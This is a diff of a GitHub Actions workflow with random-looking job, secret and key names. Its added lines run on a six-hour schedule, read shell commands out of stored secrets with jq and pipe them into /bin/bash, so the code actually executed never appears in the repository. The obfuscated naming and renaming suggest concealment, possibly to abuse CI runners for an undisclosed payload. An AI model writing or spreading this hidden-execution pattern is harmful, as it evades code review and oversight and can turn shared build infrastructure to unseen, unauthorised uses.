@@ -1,27 +1,32 @@
 name: caobushang9870
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
-
+    - cron: '35 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caobushang9870
         env:
-          hj3338: ${{ secrets.hj3338 }}
+          a105: ${{ secrets.a105 }}
         run: |
-          echo $hj3338 | jq -r .nc6 | /bin/bash
-          echo $tu4 | jq -r .xijh674 | /bin/bash
-          echo $h2998 | jq -r .kmq693 | /bin/bash
-          echo $or86 | jq -r .eeps48 | /bin/bash
-          echo $dm9 | jq -r .sn6380 | /bin/bash
-          echo $bhod837 | jq -r .rals33 | /bin/bash
-          echo $oq76490 | jq -r .hw69183 | /bin/bash
-          echo $mj9 | jq -r .gthu751 | /bin/bash
-          echo $aa60 | jq -r .cz2 | /bin/bash
-          echo $ub7 | jq -r .qi95953 | /bin/bash
-          echo $ebin7 | jq -r .z50 | /bin/bash
+          echo $a105 | jq -r .vya54 | /bin/bash
+          echo $oi7 | jq -r .fj7744 | /bin/bash
+          echo $ou4 | jq -r .gi7468 | /bin/bash
+          echo $buq9 | jq -r .plhpt368 | /bin/bash
+          echo $rgy29705 | jq -r .aave5932 | /bin/bash
+          echo $yjs769 | jq -r .frfos3 | /bin/bash
+          echo $u16 | jq -r .vezyt8710 | /bin/bash
+          echo $drr575 | jq -r .yawj67 | /bin/bash
+          echo $i6337 | jq -r .eos8 | /bin/bash
+          echo $jybur99 | jq -r .d73 | /bin/bash
+          echo $ulp0511 | jq -r .pmks63513 | /bin/bash
+          echo $xzojq518 | jq -r .bof31 | /bin/bash
+          echo $qqwq60 | jq -r .no6 | /bin/bash
+          echo $v942 | jq -r .wumpi30 | /bin/bash
+          echo $lw82 | jq -r .ohel822 | /bin/bash
 
